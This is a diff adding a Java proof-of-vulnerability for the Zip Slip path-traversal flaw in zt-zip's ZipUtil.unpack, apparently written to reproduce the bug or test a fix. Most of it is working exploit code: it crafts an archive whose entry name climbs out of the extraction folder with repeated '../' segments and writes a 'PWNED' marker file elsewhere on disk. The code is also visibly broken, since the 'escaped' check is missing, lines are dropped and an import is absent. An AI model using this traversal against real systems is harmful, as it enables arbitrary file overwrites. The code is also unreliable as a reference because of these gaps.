+import org.zeroturnaround.zip.ZipUtil;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;

+import java.util.zip.ZipOutputStream;

+/**
+ * Proof-of-vulnerability for CWE-22 (Zip Slip) in
+ * org.zeroturnaround.zip.ZipUtil.
+ *
+ * Root cause: ZipUtil$Unpacker#process (src/main/java/org/zeroturnaround/zip/ZipUtil.java,
+ * around "File file = new File(outputDir, name);" ... "FileUtils.copy(in, file);")
+ * builds the destination file directly from the (mapped) zip entry name without
+ * verifying that the resolved path stays inside outputDir. A zip entry name
+ * containing "../" traversal sequences therefore lets an attacker-controlled
+ * archive write files anywhere the JVM process can write, when extracted via
+ * the public API ZipUtil.unpack(File, File).
+ *
+ * This program:
+ *  1. Builds a malicious zip file (using the plain JDK zip APIs, not ZipUtil,
+ *     since we are attacking the *extraction* side) containing one entry whose
+ *     name is a relative path with enough "../" segments to escape the chosen
+ *     output directory and land on a fixed marker file elsewhere on disk.
+ *  2. Calls the real, public ZipUtil.unpack(File zip, File outputDir) API to
+ *     extract it -- this is the exact vulnerable code path (Unpacker.process).
+ *  3. Checks whether the marker file was written outside the intended output
+ *     directory.
+ *
+ * Exit code 0  => the traversal succeeded (vulnerable behavior reproduced).
+ * Exit code 1  => the traversal was blocked (patched behavior).
+ */
+public class ZipSlipPOV {
+
+  public static void main(String[] args) throws Exception {
+    File tmpRoot = new File(System.getProperty("java.io.tmpdir"));
+
+    // Directory the victim application intends to extract into.
+    File outputDir = new File(tmpRoot, "zipslip-pov-safe-outputdir");
+    deleteRecursively(outputDir);
+    outputDir.mkdirs();
+
+    // Fixed location OUTSIDE outputDir that a correctly-fixed ZipUtil must
+    // never write to. Its parent does not exist yet, exactly like the
+    // scenario the trace goes through (FileUtils.forceMkdir(file.getParentFile())).
+    File escapeMarkerDir = new File(tmpRoot, "zipslip-pov-escaped-marker");
+    deleteRecursively(escapeMarkerDir);
+    File escapeTarget = new File(escapeMarkerDir, "pwned.txt");
+
+    String markerContent = "PWNED-BY-ZIPSLIP-POV";
+
+    // Build the entry name: enough "../" segments to walk from outputDir back
+    // past the filesystem root, followed by the absolute path (minus leading
+    // slash) of escapeTarget. This makes the final resolved location
+    // deterministic regardless of how deep the system temp directory is.
+    int depth = outputDir.getAbsoluteFile().toPath().getNameCount() + 10;
+    StringBuilder traversal = new StringBuilder();
+    for (int i = 0; i < depth; i++) {
+      traversal.append("../");
+    }
+    String escapeAbsPath = escapeTarget.getAbsolutePath().replace(File.separatorChar, '/');
+    if (escapeAbsPath.startsWith("/")) {
+      escapeAbsPath = escapeAbsPath.substring(1);
+    }
+    String maliciousEntryName = traversal.toString() + escapeAbsPath;
+
+    File maliciousZip = new File(tmpRoot, "zipslip-pov.zip");
+    maliciousZip.delete();
+    writeMaliciousZip(maliciousZip, maliciousEntryName, markerContent);
+
+    System.out.println("[pov] malicious zip: " + maliciousZip.getAbsolutePath());
+    System.out.println("[pov] malicious entry name: " + maliciousEntryName);
+    System.out.println("[pov] intended output dir: " + outputDir.getAbsolutePath());
+    System.out.println("[pov] out-of-bounds target: " + escapeTarget.getAbsolutePath());
+
+    try {
+      // This is the real, public vulnerable API call.
+      ZipUtil.unpack(maliciousZip, outputDir);
+    }
+    catch (Exception e) {
+      // A fixed implementation is expected to reject the traversal, possibly
+      // by throwing. We don't fail on the exception itself -- we verify the
+      // actual filesystem effect below, which is the thing that matters.
+      System.out.println("[pov] ZipUtil.unpack threw: " + e);
+    }
+

+
+    if (escaped) {

+      System.exit(0);
+    }
+    else {
+      System.out.println("[pov] SAFE: no file was written outside of outputDir; "
+          + "path traversal was blocked.");
+      System.exit(1);
+    }
+  }

+  private static void writeMaliciousZip(File zipFile, String entryName, String content) throws IOException {
+    try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
+      ZipEntry entry = new ZipEntry(entryName);
+      zos.putNextEntry(entry);
+      zos.write(content.getBytes(StandardCharsets.UTF_8));
+      zos.closeEntry();
+

+      ZipEntry benign = new ZipEntry("safe.txt");
+      zos.putNextEntry(benign);
+      zos.write("benign".getBytes(StandardCharsets.UTF_8));
+      zos.closeEntry();
+    }
+  }
+
+  private static String readFile(File f) throws IOException {
+    byte[] bytes = Files.readAllBytes(f.toPath());
+    return new String(bytes, StandardCharsets.UTF_8);
+  }
+
+  private static void deleteRecursively(File f) {
+    if (f == null || !f.exists()) {
+      return;
+    }
+    File[] children = f.listFiles();
+    if (children != null) {
+      for (File c : children) {
+        deleteRecursively(c);
+      }
+    }
+    f.delete();
+  }
